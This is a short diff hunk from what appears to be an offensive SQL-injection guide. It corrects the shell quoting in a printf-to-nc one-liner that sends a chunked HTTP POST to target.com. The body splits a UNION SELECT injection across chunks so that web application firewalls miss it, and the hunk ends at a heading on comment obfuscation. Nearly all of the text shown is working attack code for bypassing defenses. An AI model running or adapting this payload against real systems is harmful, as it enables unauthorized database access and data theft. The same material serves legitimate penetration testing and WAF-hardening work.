@@ -369,7 +369,7 @@ curl -X POST http://target/api/search \
 
 ```bash
 # Some WAFs don't inspect chunked bodies
-printf 'POST /search HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n5\r\nid=1\'\r\n6\r\n UNION\r\n7\r\n SELECT\r\n5\r\n 1,2,\r\n1\r\n3\r\n3\r\n-- \r\n0\r\n\r\n' | nc target.com 80
+printf 'POST /search HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n5\r\nid=1'"'"'\r\n6\r\n UNION\r\n7\r\n SELECT\r\n5\r\n 1,2,\r\n1\r\n3\r\n3\r\n-- \r\n0\r\n\r\n' | nc target.com 80
 ```
 
 ### Comment Nesting and Obfuscation
